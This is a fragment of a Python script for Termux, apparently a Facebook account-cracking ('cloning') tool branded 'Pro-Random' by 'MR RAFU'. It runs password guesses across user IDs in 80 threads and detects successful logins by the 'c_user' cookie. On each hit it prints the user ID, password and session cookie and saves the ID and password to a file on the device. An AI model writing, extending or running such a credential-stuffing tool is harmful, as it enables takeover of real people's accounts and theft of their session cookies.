...
psb('\x1b[1;31mBANGLADESH NATION CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
|___|___||__|\_||__|    |__|\_||__|__||__|  \__,_
  ...
  \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mMR RAFU🧡   \033[1;92m|
  \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34mMD Sabbir Hossain Rafi    \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35rafu-404-cyber             \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mRandom Tools          \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mTermux RAFU                \033[1;92m|
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] BOSS NAME : {H}MR RAFU')
    print(f'{M}║══[ [•] YOR IP    : ')
    print(f'{M}║══[ [•] VERSION   : {H}1.0.9')
    print(f'{M}╚══[ [•] TOOL NAME : {H}Pro-Random💥\n')
 ...
 #   print(f"")
  #  linex()
    ...
    with ThreadPool(max_workers=80) as manshera:    
       ...
       # print(f'  {H}    {M}TOTAL CRACK RAFU ID :{H} %s          {H}     '%(tl))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;92m[NATION-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/NATION-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mNATION","\x1b[1;92mNATION","\x1b[1;93mNATION","\x1b[1;94mNATION","\x1b[1;95mNATION","\x1b[1;96mNATION","\x1b[1;97mNATION","\x1b[1;91mNATION","\x1b[1;92mNATION","\x1b[1;93mNATION","\x1b[1;94mNATION","\x1b[1;95mNATION","\x1b[1;96mNATION"])
